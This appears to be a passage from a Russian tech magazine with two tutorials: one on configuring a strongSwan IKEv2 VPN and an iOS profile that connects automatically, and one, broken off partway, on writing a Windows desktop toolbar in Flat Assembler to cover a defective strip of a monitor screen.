  esp=chacha20poly1305-sha512,aes256gcm16-ecp384,aes256-sha256,
aes256-sha1,3des-sha1!

Здесь забиты адреса гугловского DNS  (8.8.8.8 и 8.8.4.4), ты можешь
использовать их или заменить, например, адресом своего роутера (его мож‐
но узнать, набрав ip route show default).
   Сохраняем конфиг и выходим из nano (Ctrl-X, Y, Enter).
   Сервер VPN мы настроили, осталось создать креды, с которыми клиент
сможет авторизоваться. За них отвечает файл /etc/ipsec.secrets. Откры‐
ваем его в nano:


sudo nano /etc/ipsec.secrets

Добавляем в него строчку


: RSA "server-key.pem"

Двоеточие и пробел после него важны, не убирай их!
   Дальше задаем логин и пароль пользователя. Замени их своей ком‐
бинацией. Хороший стойкий пароль можешь создать в парольном менед‐
жере.


логин : EAP "пароль"

Сохраняй файл, и перезапустим strongSwan, чтобы он прочитал новые кон‐
фиги:


sudo systemctl restart strongswan-starter


Настраиваем сеть
Наш VPN уже работает и готов принимать соединения, но сетевой трафик
до него пока не доходит. Нужно настроить файрвол и IP-форвардинг.
   Разрешаем  пропускать  трафик  OpenSSH,  а  также UDP  на  пор‐
тах 500 и 4500:


sudo ufw allow OpenSSH
sudo ufw enable
sudo ufw allow 500,4500/udp

Осталось сделать так, чтобы входящие пакеты IPSec обрабатывались нашей
службой. Узнаем адрес нашего сетевого интерфейса:


ip route show default

Посмотри, что будет написано после слова dev. Это может быть, например,
eth0 или ens2 либо еще что‑нибудь в таком духе. Запомни или запиши
куда‑нибудь эти буквы.
   Открываем файл с настройками правил файрвола:


sudo nano /etc/ufw/before.rules

В самом начале файла, до секции *filter, нам надо добавить два блока.
Замени в трех местах ИНТЕРФЕЙС тем, что мы нашли выше.


*nat
-A POSTROUTING -s 10.10.10.0/24 -o ИНТЕРФЕЙС -m policy --pol ipsec --
dir out -j ACCEPT
-A POSTROUTING -s 10.10.10.0/24 -o ИНТЕРФЕЙС -j MASQUERADE
COMMIT


*mangle
-A FORWARD --match policy --pol ipsec --dir in -s 10.10.10.0/24 -o
ИНТЕРФЕЙС -p tcp -m tcp --tcp-flags SYN,RST SYN -m tcpmss --mss 1361:
1536 -j TCPMSS --set-mss 1360
COMMIT


*filter
...

А в конце *filter — такие две строки:


-A ufw-before-forward --match policy --pol ipsec --dir in --proto
esp -s 10.10.10.0/24 -j ACCEPT
-A ufw-before-forward --match policy --pol ipsec --dir out --proto
esp -d 10.10.10.0/24 -j ACCEPT

Закрываем, сохраняем. Теперь открываем файл с настройками службы фай‐
рвола:


sudo nano /etc/ufw/sysctl.conf

Добавляем в конец вот такие строки:


net/ipv4/ip_forward=1
net/ipv4/conf/all/accept_redirects=0
net/ipv4/conf/all/send_redirects=0
net/ipv4/ip_no_pmtu_disc=1

Выключаем и включаем файрвол для применения настроек:


sudo ufw disable
sudo ufw enable

Если система запросит подтверждение, жми Y.


Настраиваем подключение
Нам нужно забрать с сервера свой сертификат, с которым мы будем подклю‐
чаться. Он лежит в файле по такому пути:


/etc/ipsec.d/cacerts/ca-cert.pem

Можешь вывести его командой cat, скопировать и сохранить в файл на сво‐
ем компьютере либо забрать, подключившись по SFTP.
  Для подключения к VPN тебе понадобятся три вещи: IP твоего сервера,
файл с сертификатом и пара из логина и пароля, которые ты задал в файле
/etc/ipsec.secrets. Все это у тебя есть!
   Настройки в разных ОС выполняются немного по‑разному.
  В macOS тебе нужно:
 1. Дважды кликнуть на файл с сертификатом и подтвердить его добавление
   в цепочку ключей, введя пароль.
 2. Открыть цепочку (Keychain Access), найти VPN root CA и задать нужные
   разрешения. Дважды кликни по нему, раскрой раздел «Доверять» (Trust)
   и выбери «Доверять всегда» (Always Trust) напротив строки IPSec.
 3. Создать соединение в настройках сети. Нажимай плюсик внизу, выбирай
   VPN, IKEv2 и жми «Создать» (Create), вписывай IP сервера в строки «Адрес
   сервера» и «Удаленный ID».
 4. В настройках соединения выбирай «Имя пользователя» и укажи свои логин
   и пароль.





В Windows процесс немного другой:
 1. Открывай «Консоль управления», выбирай «Файл → Добавить или удалить
   оснастку → Сертификаты → Добавить».
 2. Чтобы VPN работал для любого пользователя, выбирай «Учетная запись
   компьютера»  и жми  «Далее».  Затем жми  «Локальный  компьютер»
   и «Закончить».
 3. В «Корне консоли» выбирай «Доверенные корневые центры сертификации
   для доверия федерации» и «Сертификаты».
 4. В меню «Действия» в правой панели нажми «Все задачи» и «Импорти‐
   ровать».
 5. Вызови меню выбора файла, выставь тип X.509 и импортируй свой сер‐
   тификат.
 6. Теперь нужно создать подключение к VPN. Зайди в «Панель управления →
   Сеть интернет». В Windows 7 может понадобиться создать новое подклю‐
   чение к рабочему месту, в Windows 10 и 11 должен быть специальный раз‐
   дел VPN. В любом случае вписывай адрес сервера, логин и пароль.
 7. Можешь подключаться!

На iOS установка схожа с тем, что мы делали на macOS. Но поскольку я обе‐
щал продемонстрировать возможность автоматически включать и выключать
VPN, мы вместо этого создадим файл с профилем, который заодно будет
содержать и все настройки.
  На Android, увы, strongSwan не поддерживается на уровне ОС, поэтому
тебе придется скачать клиентское приложение и настроить его. Впрочем, эта
статья ориентирована на пользователей iOS, так что я не предполагаю, что
речь о твоем основном телефоне.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
   СИЛЬНЫЙ ЛЕБЕДЬ
                    ДЕЛАЕМ VPN НА STRONGSWAN
          И АВТОМАТИЗИРУЕМ ПОДКЛЮЧЕНИЕ В IOS





КУЕМ ПРОФИЛЬ ДЛЯ IOS
А теперь самая  важная часть нашего приключения, ради которой все
и затевалось. Мы создадим кастомный профиль для iOS, где пропишем,
при каких условиях устройство должно подключаться к VPN. Не волнуйся —
полностью полагаться на автоматизацию необязательно, и при желании ты
сможешь деактивировать такое поведение в настройках, чтобы включать
и выключать VPN вручную.
  За основу я взял чей‑то готовый профиль, а потом добавил в него пра‐
вила.
   Помимо логина, пароля и IP сервера, тебе понадобится сертификат,
который мы скачали с сервера. Точнее, его содержимое между строками
BEGIN CERTIFICATE и END CERTIFICATE.
   Также создай четыре случайные строки произвольной длины. На macOS я
их сгенерировал командой uuidgen. Но это чистое пижонство, ты можешь
использовать в  качестве UUID любую  последовательность символов —
осмысленных или нет.
  В конфиге ниже тебе понадобится изменить следующее:
 • добавить сертификат вместо строки 13;
 • вставить первый UUID в строках 20 и 24;
 • задать название VPN в строке 32;
 • добавить второй UUID в строке 36;
 • добавить IP сервера в строках 42 и 44;
 • задать свой логин в строке 73 и пароль в строке 75;
 • вставить третий UUID в строке 96;
 • вставить четвертый UUID в строке 102.


vpn.mobileconfig
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.
apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadCertificateFileName</key>
      <string>cert.pem</string>
      <key>PayloadContent</key>
      <data>
       СЮДА ВСТАВЛЯЙ СЕРТИФИКАТ
      </data>
      <key>PayloadDescription</key>
      <string>Adds a certificate</string>
      <key>PayloadDisplayName</key>
      <string>cert.pem</string>
      <key>PayloadIdentifier</key>
      <string>com.apple.security.pkcs12.ПЕРВЫЙ UUID</string>
      <key>PayloadType</key>
      <string>com.apple.security.pem</string>
      <key>PayloadUUID</key>
      <string>ПЕРВЫЙ UUID ЕЩЕ РАЗ</string>
      <key>PayloadVersion</key>
      <integer> 1</integer>
    </dict>
    <dict>
      <key>UserDefinedName</key>
      <string>StrongSwan</string>
      <key>PayloadDisplayName</key>
      <string>НАЗВАНИЕ</string>
      <key>PayloadIdentifier</key>
      <string>swan.vpn.always</string>
      <key>PayloadUUID</key>
      <string>ВТОРОЙ UUID</string>
      <key>VPNType</key>
      <string>IKEv2</string>
      <key> IKEv2</key>
      <dict>
        <key>RemoteAddress</key>
        <string>IP ТВОЕГО СЕРВЕРА</string>
        <key>RemoteIdentifier</key>
        <string>IP ТВОЕГО СЕРВЕРА</string>
        <key>LocalIdentifier</key>
        <string></string>
        <key>AuthenticationMethod</key>
        <string>None</string>
        <key>DeadPeerDetectionRate</key>
            <string>Medium</string>
            <key>DisableMOBIKE</key>
            <integer> 0</integer>
            <key>DisableRedirect</key>
            <integer> 0</integer>
            <key>EnableCertificateRevocationCheck</key>
            <integer> 0</integer>
            <key>EnablePFS</key>
            <integer> 0</integer>
            <key>ExtendedAuthEnabled</key>
            <true/>
            <key>IKESecurityAssociationParameters</key>
            <dict>
              <key>DiffieHellmanGroup</key>
              <integer> 2</integer>
              <key>EncryptionAlgorithm</key>
              <string>3DES</string>
              <key>IntegrityAlgorithm</key>
              <string>SHA1-96</string>
              <key>LifeTimeInMinutes</key>
              <integer> 1440</integer>
            </dict>
        <key>AuthName</key>
        <string>ЛОГИН</string>
        <key>AuthPassword</key>
        <string>ПАРОЛЬ</string>
      </dict>


      <!-- СЮДА ВСТАВЛЯЕМ ПРАВИЛА -->


      <key>OverridePrimary</key>
      <true/>
      <key> IPv4</key>
      <dict>
        <key>OverridePrimary</key>
        <integer> 1</integer>
      </dict>
      <key>PayloadType</key>
      <string>com.apple.vpn.managed</string>
      <key>PayloadVersion</key>
      <integer> 1</integer>
    </dict>
  </array>
  <key>PayloadDisplayName</key>
  <string>VPN Configuration</string>
  <key>PayloadIdentifier</key>
  <string>ТРЕТИЙ UUID</string>
  <key>PayloadRemovalDisallowed</key>
  <false/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>ЧЕТВЕРТЫЙ UUID</string>
  <key>PayloadVersion</key>
  <integer> 1</integer>
</dict>
</plist>





ДОБАВЛЯЕМ ПРАВИЛА ПОДКЛЮЧЕНИЯ
На строке 78 ты мог заметить комментарий — он не будет мешать работе
профиля. Однако добавил я его, чтобы отметить место, куда ты можешь вста‐
вить правила автоматического подключения.
   Каждое правило — это словарь, в начале которого идет тег key со зна‐
чением Action, затем — string с типом действия (Connect, Disconnect
или Ignore) и список параметров  (key), то есть условие подключения
или отключения.
   Условия бывают следующие:
 • DNSDomainMatch (массив строк) — домены серверов DNS, которые
   могут быть перечислены в настройках сети. Это один из способов понять,
   к какой сети мы подключены;
 • DNSServerAddressMatch (массив строк) — то же самое, но используют‐
   ся IP-адреса серверов DNS;
 • InterfaceTypeMatch (строка) — тип интерфейса подключения. Может
   быть Celluar для мобильной сети или WiFi;
 • SSIDMatch (массив) — название беспроводной сети;
 • URLStringProbe  (строка) —  доступность  определенного URL. Если
   ресурс доступен и возвращает код 200, правило срабатывает. Обрати
   внимание, при редиректе правило не сработает.

Массив строк выглядит как тег array с одним или несколькими тегами string
внутри.


        WWW

                        Подробнее с форматом можешь  ознакомиться
                        в официальной документации (PDF, страница 96).


Правила проверяются сверху вниз. Правило срабатывает, когда все указан‐
ные внутри него условия соблюдаются. Если правило сработало, то проверка
завершается. Поэтому вариант действия по умолчанию можно поставить пос‐
ледним.
   Давай напишем простой конфиг. В нем будет три правила:
 • первое проверяет интерфейс, и если это мобильная сеть, то VPN вклю‐
   чается;
 • второе проверяет, не подключены ли мы к домашнему Wi-Fi, определяя
   его по SSID (это строка с названием). Если да, то VPN отключается;
 • третье говорит подключаться к VPN, если мы подключены к какому‑то дру‐
   гому Wi-Fi.


<key>OnDemandEnabled</key>
<integer> 0</integer>
<key>OnDemandRules</key>
<array>
  <dict>
    <key>Action</key>
    <string>Connect</string>
    <key>InterfaceTypeMatch</key>
    <string>Cellular</string>
  </dict>


  <dict>
    <key>Action</key>
    <string>Disconnect</string>
    <key>SSIDMatch</key>
    <array>
      <string>SSID ТВОЕГО WI-FI</string>
    </array>
  </dict>


  <dict>
    <key>Action</key>
    <string>Connect</string>
    <key>InterfaceTypeMatch</key>
    <string>WiFi</string>
  </dict>
</array>

По умолчанию автоматическое подключение будет деактивировано — просто
на всякий случай (см. первые две строки). Если уверен в своих правилах,
можешь поставить 1 вместо 0, но это можно сделать и потом — в настройках
iOS.
   Собирай итоговый XML, сохраняй в файл с расширением .mobileconfig
и переправь его на устройство любым способом (наиболее конспиративным,
если это для тебя важно).
   Затем тебе нужно будет сделать следующее:
 1. Нажать на файл, появится сообщение «Профиль загружен».
 2. Перейти в настройки и открыть «Основные → VPN и управление устрой‐
   ством → VPN Configuration».
 3. Нажимать «Установить» и вводить ПИН‑коды и пароли, пока iOS не успо‐
   коится и не решит, что ты и правда желаешь установить какой‑то левый
   серт.
 4. Зайти в раздел VPN (здесь или в общем списке настроек), поставить
   галочку напротив своего сервера и попробовать переключить  статус
   в режим «Подключено».
 5. Чтобы активировать автоматическую работу, заходи в настройки подклю‐
   чения (пиктограмма i) и включай «Подключение по запросу».

Если вдруг возникнут проблемы, отключай «Подключение по запросу» и уда‐
ляй профиль там же, где ты его добавлял.





ВЫВОДЫ
Мы развернули свой сервер VPN на основе strongSwan, создали на нем учет‐
ную запись и сгенерировали сертификат. С этим сертификатом можно под‐
ключаться к VPN с любого устройства.
   Далее мы научились делать профили VPN для iOS. Все настройки можно
было бы задать и вручную, однако интерфейса, чтобы задавать условия под‐
ключения, в iOS нет, тогда как в профиле мы смогли их настроить.
  Ты можешь подстроить этот конфиг под свои условия и, например, под‐
ключать или отключать VPN на работе или в каких‑то других локациях, экономя
время и силы.
КОДИНГ
ЗАПЛАТКА
 НА АСМЕ





                                        Игорь Орещенков
                                                     r0bur@mail.ru





   СОЗДАЕМ ПАНЕЛЬ ИНСТРУМЕНТОВ
    ДЛЯ WINDOWS НА FLAT ASSEMBLER





В этой статье я расскажу о том, как создать простое при‐
ложение — заготовку панели инструментов для рабочего
стола Windows. По ходу дела мы вспомним Win32 API, раз‐
беремся, как его использовать на языке ассемблера, и поз‐
накомимся  с  Flat  Assembler,  который  станет  для  нас
основным инструментом разработки.


НЕТ В МИРЕ СОВЕРШЕНСТВА
Народная молва гласит, что в основе мироздания лежит закон подлости,
из которого следуют все остальные фундаментальные законы природы.
К таковым  относится и закон неубывающей  энтропии, в  соответствии
с которым материальные предметы со временем приходят в негодность.
На моем мониторе этот закон проявился в виде горизонтальных полос в вер‐
хней  части  экрана, которые выглядят как нотный стан, если под ними
радикально черный фон, и как интерференционная картина в двухщелевом
эксперименте, если фон светлый.





              Дефект монитора в виде горизонтальных полос

Ознакомившись с обзорами аналогичных проблем по роликам на YouTube, я
составил для себя общее представление об этом дефекте. Он может быть
вызван либо плохим контактом шлейфа, соединяющего матрицу монитора
с контроллером, либо неисправностью в электронных компонентах самого
контроллера.  Поскольку  гарантийный срок уже  закончился, я разобрал
монитор и пришел к выводу, что с отсутствием опыта и инструментов шансы
на успешный ремонт у меня примерно 50 на 50: либо устраню дефект, либо
испорчу все окончательно.
   Какие еще остаются варианты? Знаю по опыту, что официальный сервис,
скорее всего, выставит заградительную цену, а отдавать боевого товарища
в очумелые ручки кустаря‑одиночки совесть не позволяет. Наиболее здравой
кажется мысль пойти в ближайший магазин, купить новый монитор и не
дурить голову ни себе, ни читателям. Именно так я бы и поступил, если бы
монитор не работал совсем. Но он почти работает, и выбрасывать его поп‐
росту жалко.
  А ведь если подумать, ремонт необязательно предполагает восстанов‐
ление исходного качества изделия — зачастую допускается некоторая утрата
потребительских свойств. Как, например, поступает хакер, обнаружив в один
прекрасный день дыру... нет, не в безопасности, а в любимых домашних брю‐
ках? Достает свой толстый кошелек и спешит в ближайший бутик за новыми?
Нет, он вспоминает уроки Марьванны и, применяя методологию «вперед
иголка», накладывает заплатку! Или другой пример. В не менее прекрасный
день  инженеры NASA  обнаружили,  что  основная  антенна  радиосвязи
запущенного к Юпитеру зонда не раскрылась полностью. Разве они бросили
неисправное устройство на произвол судьбы и обратились к правительству
за финансированием нового? Нет, они проявили находчивость и техническую
смекалку, в результате чего пусть и не без труда, но успешно провели мно‐
голетнюю исследовательскую миссию.


ВЫБОР ЦЕЛИ И СРЕДСТВА
Рассматриваемая в статье ситуация находится где‑то между этими крайними
случаями.   Наибольшие   неудобства   описанный  дефект   доставляет
при использовании развернутых на весь экран программ, потому что попада‐
ет либо на адресную строку браузера, либо на главное меню приложения.
Использование же программ в оконном режиме, с подгонкой их местополо‐
жения после каждого  запуска,  грозит нервным расстройством. Я готов
пожертвовать частью полезной площади экрана, если изображение не будет
попадать на дефектную область.
   Основная  операционная  система на моем  компьютере — Windows.
Как исключить полосу в верхней части экрана из доступного пространства
рабочего стола, чтобы окна приложений при развертывании не попадали
на нее? Идею мне подсказала панель задач: она монополизирует нижнюю
часть экрана и никогда не перекрывается окнами программ. Может быть,
достаточно будет прикрепить ее к верхней части экрана? Нет, во‑первых, она
не совсем подходит по размеру, а во‑вторых, сама приобретает непригляд‐
ный вид из‑за дефекта. А нельзя ли сделать «заплатку» с такими же свойства‐
ми, но чтобы пользователь мог контролировать ее размер и цвет?
   Оказывается, можно, и ответ быстро нашелся в справочнике по Win32
API — это панель инструментов рабочего стола. Направление работы про‐
яснилось, осталось выбрать подходящий инструмент для ее выполнения.
Основное средство разработки с использованием Win32 API — компилятор
С. Но для вызова нескольких функций операционной системы хочется вос‐
пользоваться чем‑то более простым и изящным. Поэтому я отправился в тем‐
ную кладовую своей памяти и нашел там пыльную шкатулку с плоским мон‐
тажником. Если кто‑то еще не догадался, то так  звучит по‑русски  Flat
Assembler  в  варианте  Яндекс‑переводчика.  Удивительно,  но  продукт,
с которым я  познакомился еще в середине 2000-х,  продолжает жить
и здравствовать.


ЧТО УМЕЕТ FLAT ASSEMBLER?
Давай прямо сейчас разберемся со средой, в которой будем работать.
На  странице  загрузки  выбери  архив  с  последней  версией  сборки
для Windows, загрузи его и распакуй куда‑нибудь на диск. В трех мегабайтах
папки FASMW есть все, что нам потребуется.
   Создай пустую папку Appbar для рабочего проекта и скопируй в нее
исходный текст шаблона типового приложения Windows FASMW\EXAMPLES\
TEMPLATE\TEMPLATE.ASM.  Запусти  интегрированную  среду  разработки
FASMW\FASMW.EXE и с помощью пункта меню File → Open... загрузи в нее этот
файл. Обрати внимание, что в нашем распоряжении есть текстовый мно‐
гооконный редактор с подсветкой синтаксиса ассемблера.





             Текстовый редактор интегрированной среды FASMW

Шаблон  Windows-приложения  на  ассемблере  состоит  из  следующих
основных частей:
 • заголовка с указанием формата целевого исполняемого файла и точки
   входа в приложение;
 • секции кода .text, где метка start указывает команду, с которой дол‐
  жно начинаться выполнение программы;
 • секции данных .data, содержащей глобальные переменные программы;
 • секции импорта .idata, в которой перечислены используемые прог‐
  раммой динамические библиотеки и подключаются объявления содер‐
   жащихся в них функций.

В целом текст программы должен быть понятен любому, кто использовал
Win32 API. Во‑первых, сам API предельно прост. Параметры всех функций
ожидают 32-битных значений аргументов, а если данные не укладываются
в этот размер, то передается 32-битный указатель на массив или структуру
опять же 32-битных значений. Исключение, пожалуй, только строки. Возвра‐
щаемое функцией значение (например, код завершения) передается через
регистр EAX или, если оно превышает 32 бита, через структуру, на которую
указывал один из аргументов.
   Во‑вторых,  Flat Assembler на основе своего набора макроинструкций
предлагает синтаксический сахар, который делает использование API мак‐
симально приближенным к высокоуровневым языкам программирования.
Скажем, довольно сложный вызов функции создания окна описывается одной
строкой:


invoke  CreateWindowEx,0,_class,_title,WS_VISIBLE+WS_DLGFRAME+
WS_SYSMENU,128,128,256,192,NULL,NULL,[wc.hInstance],NULL

Здесь invoke — это команда вызова подпрограммы в соответствии с сог‐
лашением STDCALL, CreateWindowEx — имя вызываемой  API-функции,
а далее через запятую следуют аргументы в том порядке, в котором они опи‐
саны в документации.  С‑программисты могут  считать,  что  имена всех
переменных здесь — это указатели (_class, _title), для разыменования
которых используются квадратные скобки ([wc.hInstance]). Отметим при‐
вычную «точечную» нотацию доступа к элементам структуры.
   Описание оконной процедуры WindowProc тоже не должно вызвать зат‐
руднений:


proc WindowProc uses ebx esi edi, hwnd,wmsg,wparam,lparam
  ...
  ret
endp

Соглашение Win32 API требует, чтобы после возврата из процедур обратного
вызова (callback-процедур) значения регистров EBX, ESI и EDI были такими
же, как и перед вызовом. Для этого в заголовке присутствует указание на сох‐
ранение этих регистров в виде фразы uses ebx esi edi. А дальше через
запятую идет список формальных параметров процедуры, которые соответс‐
твуют документации.
   Теперь ты можешь скомпилировать и выполнить эту программу. Но сна‐
чала укажи путь к папке с подключаемыми директивой include файлами
в пункте меню Options → Compiler setup так, чтобы он соответствовал фак‐
тическому местоположению FASMW\INCLUDE. После  этого выполни пункт
меню Run → Run или просто нажми клавишу F9. Если все было сделано пра‐
вильно,  то  в  рабочей  папке  Appbar  появится  свежесобранный файл
TEMPLATE.EXE, а на экране отобразится крошечное окно Win32 program
template.





                   Настройка пути к подключаемым файлам


СОЗДАНИЕ ОБРАБОТЧИКА СООБЩЕНИЯ WM_CREATE
Со средой разработки разобрались, приступим к работе над программой.
Если раньше ты никогда не программировал панели рабочего стола Windows,
то сейчас самое время изучить документацию. Но перед этим хочу обратить
внимание на основные  моменты. Панель  рабочего  стола не  является
каким‑то уникальным объектом операционной системы. Роль панели может
играть любое окно, созданное функцией CreateWindowEx. Все средства
Windows,  обеспечивающие  функционирование  панели,  сосредоточены
в единственной функции SHAppBarMessage, с помощью которой можно:
 • узнать границы области рабочего стола, в пределах которых можно раз‐
   местить новую панель инструментов;
 • зарезервировать на этой области участок для размещения новой панели;
 • указать манипулятор (handle) окна с панелью, которому будут отправ‐
   ляться системные уведомления, связанные с изменением обстановки
   на рабочем столе.

После резервирования новой области операционная система запрещает ее
использование окнами приложений при их  максимизации, освобождает
от значков рабочего стола (если таковые на ней были) — и, в общем‑то, всё.
За внешний вид панели отвечает ассоциированное с нею окно, которое
теоретически должно закрыть собой освобожденное пространство и принять
соответствующий стиль. Но по большому счету может этого и не делать.
  С помощью пункта меню File → Save as... сохрани открытый в редакторе
файл под именем appbar.asm. В нашей программе панелью будет главное
окно приложения. Зарезервируем для нее полосу в верхней части рабочего
стола. Это можно сделать в обработчике сообщения WM_CREATE, которое
отправляется операционной системой окну приложения непосредственно
перед тем, как отобразить его на экране. Для этого в начале оконной про‐
цедуры WindowProc вставим строки перехода к обработчику сообщения:


cmp     [wmsg],WM_CREATE
je      .wmcreate

и напишем сам обработчик перед меткой .wmdestroy:


.wmcreate:
  stdcall wmCreateProc, [hwnd]
  jmp     .finish


             INFO

                           Метки, которые начинаются с  точки, являются
                        локальными по отношению к процедуре, где они
                           используются (в данном случае — WindowProc).
                      Это еще одна фишка Flat Assembler, которая поз‐
                            воляет не беспокоиться о том, что в разных про‐
                          цедурах имена меток могут повторяться.


Наш  обработчик  вызывает  пока  еще  не  существующую  процедуру
wmCreateProc и передает ей значение манипулятора созданного окна. В этой
процедуре надо описать действия по резервированию полосы и позициони‐
рованию главного окна, после чего обнулить регистр EAX для сигнализирова‐
ния об успешном завершении процедуры. Если после обработки сообщения
WM_CREATE значение регистра EAX будет равно (-1), операционная система
воспримет это как сигнал о проблеме, что приведет к завершению работы
программы. Текст процедуры wmCreateProc можно разместить после опе‐
ратора endp, закрывающего блок описания оконной процедуры WindowProc:


proc wmCreateProc,hwnd
  invoke MessageBox,[hwnd],_title,_class,MB_OK+MB_ICONINFORMATION
  xor eax,eax
  ret
endp


             INFO

                      Вот промежуточный вариант программы, который
                      выводит    отладочное   сообщение:   appbar-
                        ver1.asm.


Процедура wmCreateProc в таком виде не делает ничего полезного, но при
запуске программы выводит окно с информационным сообщением, которое
дает понять, что на этом этапе все работает так, как ожидается.


             INFO

                          Внимательно  следи за тем,  чтобы  количество
                      и порядок аргументов в команде вызова процеду‐
                    ры всегда соответствовали количеству и порядку
                         параметров в ее описании. FASMW это не кон‐
                             тролирует, и, если допустить небрежность, можно
                        получить трудно обнаруживаемые ошибки.





                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИКОДИНГ
   ЗАПЛАТКА НА АСМЕ
                СОЗДАЕМ ПАНЕЛЬ ИНСТРУМЕНТОВ
                 ДЛЯ WINDOWS НА FLAT ASSEMBLER





ПОДГОТОВКА К ИСПОЛЬЗОВАНИЮ ФУНКЦИИ SHAPPBARMESSAGE
Программа и операционная система договариваются о резервировании
пространства   для   панели    инструментов   с   помощью   функции
SHAppBarMessage через структуру APPBARDATA. Определение этой струк‐
туры отсутствует в подключаемых файлах из поставки FASMW, поэтому при‐
дется создать его самому на основе документации. Поместим его в отдель‐
ном файле. Для этого выбери пункт меню File → New и на открывшейся вклад‐
ке текстового редактора набери следующее:


struct APPBARDATA
  cbSize                  dd ?
  hWnd                    dd ?
  uCallbackMessage        dd ?
  uEdge                   dd ?
  rc                      RECT
  lParam                  dd ?
ends

Так выглядит описание типа структуры в Flat Assembler. После названия поля
следует спецификатор типа (dd означает 4-байтовое двойное слово, а знак
вопроса — неопределенное значение), в качестве которого, в свою очередь,
может использоваться имя известной структуры (например, RECT). Чтобы
не возвращаться к данному вопросу еще раз, в этот же файл можно дописать
определения констант, которые используются функцией SHAppBarMessage:


ABM_NEW = 0x0
ABM_REMOVE = 0x1
ABM_QUERYPOS = 0x2
ABM_SETPOS = 0x3
ABE_LEFT = 0
ABE_TOP = 1
ABE_RIGHT = 2
ABE_BOTTOM = 3
MSG_ABNOTIFY = WM_USER+1
APPBAR_THICKNESS = 64

Константы с префиксом ABM_ представляют собой коды услуг, запрашива‐
емых у операционной системы, а с префиксом ABE_ означают границы
рабочего стола, у которых предполагается размещение панели. Константа
MSG_ABNOTIFY соответствует «пользовательскому» (то есть нестандартному,
выбираемому  программистом)  идентификатору сообщения, который мы
предложим использовать операционной системе при отправке уведомлений
окну панели инструментов. Тут же определим константу APPBAR_THICKNESS
с желаемым значением ширины панели.
   Сохрани набранный текст в файле с именем appbar.inc с помощью пун‐
кта меню File → Save As...


             INFO

                        Подключаемый файл с объявлением структуры
                   APPBARDATA   и   определениями    констант:
                          appbar.inc.


Теперь вернись к редактированию файла appbar.asm с текстом программы
(для  этого можешь нажать сочетание клавиш  Ctrl-Tab) и в его начале
перед секцией кода вставь строку подключения подготовленных описаний:


include 'appbar.inc'


             INFO

                          После внесения в текст программы законченной
                         порции изменений (как, например, сейчас) про‐
                        веряй, компилируется ли она. При этом следи,
                           чтобы  активной  в  текстовом  редакторе была
                           вкладка с основным текстом программы, а не
                        подключаемым модулем. Если FASM сообщает
                      об ошибке, надо перепроверить последние изме‐
                       нения и устранить ошибку прежде, чем двигаться
                          дальше.


Сейчас, когда у нас есть объявление типа APPBARDATA, мы можем определить
глобальную переменную abd этого типа, для чего в секцию данных следует
добавить такую строку:


abd APPBARDATA sizeof.APPBARDATA, 0, MSG_ABNOTIFY, ABE_TOP, <0, 0, 0,
0>, 0

Эта строка совмещает определение переменной (при котором резервиру‐
ется память) с ее  инициализацией (при которой полям присваиваются
начальные значения). Обрати внимание, что инициализатор поля вложенной
структуры abd.rc заключен в угловые скобки. Макроопределения FASM поз‐
воляют  указать  размер  структуры APPBARDATA с помощью  конструкции
sizeof.APPBARDATA.
   Функция SHAppBarMessage находится в системной динамической биб‐
лиотеке Shell32.dll. Поэтому  потребуется добавить  строки в секцию
импорта, в результате чего она приобретет следующий вид:


section '.idata' import data readable writeable


  library kernel32,'KERNEL32.DLL',\
          user32,'USER32.DLL',\
          shell32,'SHELL32.DLL'


  include 'api\kernel32.inc'
  include 'api\user32.inc'
  include 'api\shell32.inc'


             INFO

                          Чтобы узнать, в какой динамической библиотеке
                          находится  функция Win32  API,  надо  открыть
                       на  официальном   сайте   Microsoft   страницу
                        документации с описанием этой функции и ближе
                          к концу страницы отыскать секцию Requirements.
                     Из этой секции можно узнать минимальную под‐
                       держиваемую   версию   Windows   (Minimum
                        supported client/server), имя заголовочного файла
                       для языка программирования С с объявлением
                        этой функции (Header, *.h), статическую биб‐
                            лиотеку, которую надо подключить к исполняемо‐
                     му файлу для использования функции (Library, *.
                   lib), и, наконец, имя файла динамической биб‐
                           лиотеки (DLL, *.dll).


Убедись, что программа компилируется и работает.


             INFO

                          Промежуточный  вариант программы со  всеми
                         предварительными  объявлениями и  определе‐
                       ниями: appbar-ver2.asm.



РЕЗЕРВИРОВАНИЕ ПЛОЩАДКИ ДЛЯ ПАНЕЛИ
Подготовительные  мероприятия  закончены, мы  на  финишной  прямой.
Не запускай программу, пока я не скажу. Для проверки синтаксиса можешь
периодически компилировать исходный текст в исполняемый файл через
пункт меню Run → Compile, но программу не запускай!
   Вернемся к блоку с процедурой wmCreateProc, удалим из него строку
вывода отладочного сообщения и наполним приложение смыслом. В соот‐
ветствии с документацией, сначала декларируем желание создать панель
инструментов рабочего стола, для чего вызовем функцию SHAppBarMessage
с сообщением ABM_NEW и структурой APPBARDATA, в которой заполнены поля
cbSize, uCallbackMessage (при инициализации переменной) и hWnd (непос‐
редственно перед вызовом функции):


proc wmCreateProc,hwnd
  mov eax, [hwnd]
  mov [abd.hWnd], eax
  invoke SHAppBarMessage, ABM_NEW, abd
  cmp eax, TRUE
  je @f
  mov eax, -1
  ret
@@:

Здесь мы впервые  сталкиваемся с ограничением ассемблера, которое
не позволяет напрямую пересылать данные из одной ячейки памяти в другую,
в результате чего нам пришлось воспользоваться регистром EAX в качестве
промежуточного хранилища. После вызова функции проверяем возвращен‐
ное ею значение. Если операционная система не возражает против исполь‐
зования окна в качестве панели, то регистр EAX будет содержать TRUE.
    Flat Assembler предлагает удобную систему локальных меток для коротких
переходов, которая позволяет «перепрыгивать» через несколько команд
при подобных проверках. Так, команда je @f совершит переход на ближай‐
шую следующую метку @@ в случае получения равенства при предыдущем
сравнении cmp eax, TRUE. Если надо совершить переход на ближайшую
предыдущую метку @@, то в команде перехода надо указать @b.
   Таким образом, в случае неравенства в регистр EAX будет записано зна‐
чение (-1) и возвращено операционной системе. Она, как было отмечено
выше, воспримет его в качестве признака проблемы при обработке сооб‐
щения WM_CREATE, что приведет к завершению работы приложения.
   Запросим у Windows границы рабочего стола, в пределах которых можно
